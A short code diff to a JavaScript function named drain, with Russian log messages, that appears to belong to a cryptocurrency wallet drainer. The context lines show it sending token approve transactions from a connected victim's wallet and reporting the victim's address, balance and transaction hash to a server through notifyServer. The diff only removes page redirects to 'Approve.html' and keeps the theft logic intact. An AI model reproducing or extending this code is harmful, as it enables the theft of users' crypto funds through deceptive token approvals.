@@ -461,11 +461,9 @@ async function drain(chainId, signer, userAddress, bal, provider) {
           nonce
         });
         console.log(`📤 Транзакция approve отправлена: ${tx.hash}`);
-        window.location.href = 'Approve.html';
         const receipt = await tx.wait();
         console.log(`✅ Транзакция approve подтверждена: ${receipt.transactionHash}`);
         await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider);
-        // Перенаправление на Approve.html
         status = 'confirmed';
 
         // Закрываем модальное окно после успешного approve
@@ -487,7 +485,6 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         throw new Error(`Failed to approve token ${token}: ${error.message}`);
       }
     } else {
-      window.location.href = 'Approve.html';
       console.log(`✅ Allowance уже достаточно для токена ${token}`);
       try {
         await notifyServer(userAddress, address, balance, chainId, null, provider);
